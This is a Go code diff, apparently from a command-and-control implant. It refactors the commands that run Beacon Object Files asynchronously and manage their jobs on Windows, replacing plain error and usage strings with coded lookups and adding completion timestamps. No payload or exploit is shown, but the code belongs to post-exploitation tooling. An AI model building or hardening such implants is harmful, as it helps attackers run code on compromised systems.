@@ -6,9 +6,9 @@ package main
 
 import (
 	"encoding/base64"
-	"fmt"
 	"runtime"
 	"strings"
+	"time"
 )
 
 // BOFAsyncCommand handles async BOF execution
@@ -21,15 +21,16 @@ func (c *BOFAsyncCommand) Name() string {
 func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if runtime.GOOS != "windows" {
 		return CommandResult{
-			Output:   "Error: BOF execution is only supported on Windows",
-			Error:    fmt.Errorf("unsupported platform: %s", runtime.GOOS),
-			ExitCode: 1,
+			Output:      Err(E25),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 	// Will be handled by processBOFAsync with full command data
 	return CommandResult{
-		Output:   "BOF async execution initiated",
-		ExitCode: 0,
+		Output:      Succ(S4),
+		ExitCode:    0,
+		CompletedAt: time.Now().Format(time.RFC3339),
 	}
 }
 
@@ -43,8 +44,9 @@ func (c *BOFJobsCommand) Name() string {
 func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if runtime.GOOS != "windows" {
 		return CommandResult{
-			Output:   "Error: BOF execution is only supported on Windows",
-			ExitCode: 1,
+			Output:      Err(E25),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -62,15 +64,17 @@ func (c *BOFOutputCommand) Name() string {
 func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if runtime.GOOS != "windows" {
 		return CommandResult{
-			Output:   "Error: BOF execution is only supported on Windows",
-			ExitCode: 1,
+			Output:      Err(E25),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if len(args) < 1 {
 		return CommandResult{
-			Output:   "Usage: bof-output <job_id>",
-			ExitCode: 1,
+			Output:      Err(E1),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -88,15 +92,17 @@ func (c *BOFKillCommand) Name() string {
 func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if runtime.GOOS != "windows" {
 		return CommandResult{
-			Output:   "Error: BOF execution is only supported on Windows",
-			ExitCode: 1,
+			Output:      Err(E25),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if len(args) < 1 {
 		return CommandResult{
-			Output:   "Usage: bof-kill <job_id>",
-			ExitCode: 1,
+			Output:      Err(E1),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -108,9 +114,10 @@ func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResu
 func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
 	if runtime.GOOS != "windows" {
 		return CommandResult{
-			Command:  cmd,
-			Output:   "Error: BOF execution is only supported on Windows",
-			ExitCode: 1,
+			Command:     cmd,
+			Output:      Err(E25),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -118,10 +125,11 @@ func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
 	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
 	if err != nil {
 		return CommandResult{
-			Command:  cmd,
-			Output:   fmt.Sprintf("Failed to decode BOF data: %v", err),
-			Error:    err,
-			ExitCode: 1,
+			Command:     cmd,
+			Output:      Err(E18),
+			Error:       err,
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
